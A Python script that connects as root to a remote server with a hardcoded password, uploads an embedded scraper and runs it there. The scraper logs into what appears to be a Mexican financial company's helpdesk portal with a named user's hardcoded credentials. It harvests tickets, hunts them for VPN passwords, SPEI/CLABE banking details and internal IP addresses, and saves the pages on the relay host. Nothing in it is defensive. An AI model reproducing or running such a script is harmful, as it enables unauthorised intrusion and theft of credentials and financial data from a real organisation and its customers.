import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, re, time
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": UA})
PAO = "https://pao.findep.com.mx"

# LOGIN
r_login = s.post(f"{PAO}/MRcgi/MRlogin.pl",
    data={"USER": "bmendezar", "PASSWORD": "Pao1234+", "USERID": "bmendezar",
          "MRSubmit": "Submit", "PROJECTID": "1", "LASTSTEP": "1"},
    timeout=20, allow_redirects=True)
mrp = re.search(r'NAME=MRP\s+VALUE="([^"]+)"', r_login.text)
MRP = mrp.group(1) if mrp else ""
sys.stdout.write(f"MRP: {MRP}\n\n")

# Follow redirect
params = {
    "CUSTM": "bmendezar", "USER": "bmendezar", "PROJECTID": "50",
    "WRITECACHE": "1", "CUSTUSER": "on", "MRP": MRP,
    "FIRST_TIME_IN_FP": "1", "FIRST_TIME_IN_PROJ": "1",
    "USERID": "bmendezar", "MRSubmit": "Submit", "LASTSTEP": "1",
}
r_home = s.get(f"{PAO}/MRcgi/MRhomepage.pl", params=params, timeout=60)
html = r_home.text
sys.stdout.write(f"Homepage: {len(html)}b\n\n")

SP = f"USER=bmendezar&MRP={MRP}&PROJECTID=50"

# ========================================
# 1. EXTRACT ticketData JSON
# ========================================
sys.stdout.write("=" * 60 + "\n=== TICKET DATA JSON ===\n" + "=" * 60 + "\n\n")

# Look for ticketData variable
td_match = re.search(r'var\s+ticketData\s*=\s*(\{.*?\});', html, re.S)
if td_match:
    try:
        data = json.loads(td_match.group(1))
        rows = data.get("rows", [])
        sys.stdout.write(f"Tickets in grid: {len(rows)}\n\n")
        
        for row in rows[:50]:
            sys.stdout.write(f"  {json.dumps(row, ensure_ascii=False)[:200]}\n")
    except:
        sys.stdout.write(f"JSON parse failed. Raw: {td_match.group(1)[:500]}\n")
else:
    # Try different patterns
    td_match2 = re.search(r'ticketData\s*=\s*(\[.*?\]);', html, re.S)
    if td_match2:
        sys.stdout.write(f"Found array: {td_match2.group(1)[:500]}\n")
    
    # Try to find any JSON blob with ticket data
    json_blobs = re.findall(r'\{[^{}]*"actualTitleText"[^{}]*\}', html)
    sys.stdout.write(f"\nTicket JSON blobs: {len(json_blobs)}\n")
    for jb in json_blobs[:20]:
        sys.stdout.write(f"  {jb[:200]}\n")

# Extract actualTitleText entries (ticket titles)
titles = re.findall(r'"actualTitleText":"(.*?)"', html)
sys.stdout.write(f"\nTicket titles ({len(titles)}):\n")
for t in titles[:50]:
    decoded = t.encode().decode('unicode_escape', errors='replace')
    sys.stdout.write(f"  {decoded[:150]}\n")

# Extract ticket IDs
ids_in_grid = re.findall(r'"rowId":(\d+)', html)
sys.stdout.write(f"\nRow IDs: {ids_in_grid[:30]}\n")


# ========================================
# 2. READ INDIVIDUAL VPN/PASSWORD TICKETS
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== READ VPN/PASSWORD TICKETS ===\n" + "=" * 60 + "\n\n")

# Extract ticket page URLs from the homepage
ticket_urls = re.findall(r'MRTicketPage\.pl\?([^"\']+)', html)
sys.stdout.write(f"Ticket page URLs: {len(ticket_urls)}\n")

# Try ticket 1137712 (VPN password)
interesting_ids = ["1137712"]

# Also extract any MESSION/ticket IDs from the grid
grid_ids = re.findall(r'(?:MESSION|ESSION|LASTID)=(\d+)', html)
sys.stdout.write(f"Grid ticket IDs: {sorted(set(grid_ids))[:20]}\n\n")

# Add grid IDs to read
for gid in sorted(set(grid_ids)):
    if gid not in interesting_ids and int(gid) > 100:
        interesting_ids.append(gid)

for tid in interesting_ids[:15]:
    try:
        # Try MRTicketPage.pl (the JS variable format)
        r_ticket = s.get(f"{PAO}/MRcgi/MRTicketPage.pl?{SP}&LASTID={tid}&MESSION={tid}",
            timeout=15)
        
        if r_ticket.status_code == 200 and len(r_ticket.text) > 5000:
            title = re.search(r'<title>(.*?)</title>', r_ticket.text[:3000], re.I)
            has_login = "MRlogin" in r_ticket.text[:3000]
            
            if not has_login:
                sys.stdout.write(f"\n*** Ticket {tid}: [{r_ticket.status_code}] ({len(r_ticket.text)}b) ***\n")
                sys.stdout.write(f"  Title: {title.group(1)[:60] if title else 'N/A'}\n")
                
                # Extract description
                desc = re.findall(r'class="[^"]*desc[^"]*"[^>]*>(.*?)</(?:td|div|span)', r_ticket.text, re.S|re.I)
                for d in desc[:3]:
                    clean_d = re.sub(r'<[^>]+>', ' ', d).strip()
                    clean_d = re.sub(r'\s+', ' ', clean_d)
                    if len(clean_d) > 5:
                        sys.stdout.write(f"  Desc: {clean_d[:300]}\n")
                
                # Extract all text content
                all_text = re.sub(r'<[^>]+>', ' ', r_ticket.text)
                all_text = re.sub(r'\s+', ' ', all_text)
                
                # Search for interesting keywords
                for kw in ["vpn", "password", "contrase", "clave", "acceso", "servidor",
                           "SPEI", "STP", "clabe", "transferencia", "IP ", "10.", "192.", "172."]:
                    for m in re.finditer(kw, all_text, re.I):
                        start = max(0, m.start()-30)
                        end = min(len(all_text), m.end()+100)
                        sys.stdout.write(f"    [{kw}]: ...{all_text[start:end]}...\n")
                
                # Save full ticket
                with open(f'/root/fp_ticket_{tid}.html', 'w') as f:
                    f.write(r_ticket.text)
                sys.stdout.write(f"  Saved to /root/fp_ticket_{tid}.html\n")
            else:
                sys.stdout.write(f"  Ticket {tid}: login page (no access)\n")
        else:
            sys.stdout.write(f"  Ticket {tid}: [{r_ticket.status_code}] ({len(r_ticket.text)}b)\n")
    except Exception as e:
        sys.stdout.write(f"  Ticket {tid}: ERR {str(e)[:60]}\n")
    sys.stdout.flush()


# ========================================
# 3. SEARCH PAGE
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== SEARCH PAGE ===\n" + "=" * 60 + "\n\n")

r_search = s.get(f"{PAO}/MRcgi/MRsearch_page.pl?{SP}&DOWHAT=SEARCH&OPTION=none&LASTID=20563",
    timeout=15)
sys.stdout.write(f"Search page: [{r_search.status_code}] ({len(r_search.text)}b)\n")

if r_search.status_code == 200 and len(r_search.text) > 5000:
    title = re.search(r'<title>(.*?)</title>', r_search.text[:3000], re.I)
    sys.stdout.write(f"Title: {title.group(1)[:60] if title else 'N/A'}\n")
    
    # Look for search form
    search_fields = re.findall(r'name="([^"]+)"', r_search.text[:10000])
    sys.stdout.write(f"Search fields: {search_fields[:20]}\n")
    
    # Try submitting a search for SPEI
    search_data = {name: "" for name in search_fields}
    search_data.update({
        "USER": "bmendezar", "MRP": MRP, "PROJECTID": "50",
        "DOWHAT": "SEARCH", "SEARCHTERMS": "SPEI",
    })
    
    r_results = s.post(f"{PAO}/MRcgi/MRsearch_page.pl", data=search_data, timeout=30)
    sys.stdout.write(f"\nSearch results: [{r_results.status_code}] ({len(r_results.text)}b)\n")
    
    # Also try NAMP search
    r_namp = s.get(f"{PAO}/MRcgi/MRNampSearchResults.pl?{SP}&SEARCHTERMS=VPN+password&LASTID=20563",
        timeout=15)
    sys.stdout.write(f"NAMP search: [{r_namp.status_code}] ({len(r_namp.text)}b)\n")
    
    if r_namp.status_code == 200 and len(r_namp.text) > 1000:
        result_titles = re.findall(r'"actualTitleText":"(.*?)"', r_namp.text)
        sys.stdout.write(f"Search results titles: {len(result_titles)}\n")
        for rt in result_titles[:10]:
            sys.stdout.write(f"  {rt[:100]}\n")


# ========================================
# 4. CREATE TICKET PAGE
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== CREATE TICKET ===\n" + "=" * 60 + "\n\n")

r_create = s.get(f"{PAO}/MRcgi/MRTicketPage.pl?{SP}&MAJOR_MODE=CREATE&LASTID=20563",
    timeout=15)
sys.stdout.write(f"Create page: [{r_create.status_code}] ({len(r_create.text)}b)\n")

if r_create.status_code == 200 and len(r_create.text) > 5000:
    title = re.search(r'<title>(.*?)</title>', r_create.text[:3000], re.I)
    sys.stdout.write(f"Title: {title.group(1)[:60] if title else 'N/A'}\n")
    
    # Extract categories/services
    options = re.findall(r'<option[^>]*value="([^"]+)"[^>]*>(.*?)</option>', r_create.text, re.I)
    sys.stdout.write(f"Service categories ({len(options)}):\n")
    for val, label in options[:30]:
        clean = re.sub(r'<[^>]+>', '', label).strip()
        if clean:
            sys.stdout.write(f"  {val}: {clean[:60]}\n")


sys.stdout.write("\n\n=== ALL DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/fp_extract.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/fp_extract.py 2>&1', timeout=120)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
